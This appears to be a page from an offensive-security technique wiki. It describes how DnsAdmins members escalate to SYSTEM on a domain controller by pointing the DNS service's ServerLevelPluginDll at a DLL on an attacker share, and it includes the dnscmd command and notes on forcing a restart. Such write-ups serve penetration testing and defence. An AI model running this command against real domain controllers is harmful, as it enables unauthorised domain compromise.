---
title: "DnsAdmins: a DLL loaded into the DNS service as SYSTEM"
order: 8
description: "Abusing membership of the DnsAdmins group to load an arbitrary DLL into the Windows DNS service, which runs as SYSTEM on the domain controller, by setting ServerLevelPluginDll and restarting the service."
keywords:
  - DnsAdmins
  - ServerLevelPluginDll
  - dnscmd
  - DNS service
  - privilege escalation
---

# DnsAdmins

Members of **DnsAdmins** manage the DNS server, and the Microsoft DNS service exposes a **server-level plugin DLL** feature: a path in `ServerLevelPluginDll` that the service loads at startup. The service (`dns.exe`) runs as **SYSTEM** on the domain controller, and the path is loaded **without validation**. So a DnsAdmins member points it at a malicious DLL on a share, restarts the service, and gets SYSTEM code execution on the DC, which is domain compromise.

## The attack

`ServerLevelPluginDll` is a **DNS server property** set through the DNS management RPC (it is not an AD LDAP attribute), so `dnscmd` is the native way to set it; the gate is write access to that property, which DnsAdmins, or a DACL on the DNS server object, grants:

```bash
# From a DnsAdmins member: point the plugin DLL at an attacker share
dnscmd <dc> /config /serverlevelplugindll \\attacker\share\evil.dll
```

The DLL only needs to export **`DnsPluginInitialize`** (and the other plugin entry points); your payload runs from there as SYSTEM. The catch is that the DLL loads only when the **DNS service restarts**, and default DnsAdmins members **cannot** stop/start the service remotely. So you either wait for a legitimate restart (or host reboot), pair with a service-control right ([Server Operators](server-operators.md)), or use the DNS-management RPC reload that Semperis documented (which has operational side effects). Afterwards, clear the `ServerLevelPluginDll` value and let DNS restart to restore service.

## Exploitation notes

- The gate is the **DNS service restart**, and default DnsAdmins members **cannot** restart it remotely; wait for a restart or reboot, use a service-control right ([Server Operators](server-operators.md)), or the documented DNS-RPC reload. Pair accordingly.
- An invalid or crashing DLL breaks DNS for the domain, which is disruptive and noisy, so test the DLL and restore the config promptly.
- This is a classic "almost-DA" group to hunt for in [ACL enumeration](acl-enumeration.md) / BloodHound; DnsAdmins is frequently handed out to helpdesk or server teams.
- The same `serverLevelPluginDll` write is reachable through any [DACL edge](index.md) that lets you modify the DNS server object, not only group membership.

## Tools

- **dnscmd**: native, sets `ServerLevelPluginDll` via the DNS management RPC.
- **dnsserver RPC tooling** (for example `dnsserver.py`-style clients): set the plugin DLL remotely.
- **A separate service-restart right (Server Operators) or a host reboot**: load the DLL (default DnsAdmins cannot restart the service).

## References

- [ired.team: from DnsAdmins to SYSTEM to domain compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
- [Semperis: DnsAdmins revisited](https://www.semperis.com/blog/dnsadmins-revisited/)
- [HackTricks: privileged groups and token privileges](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
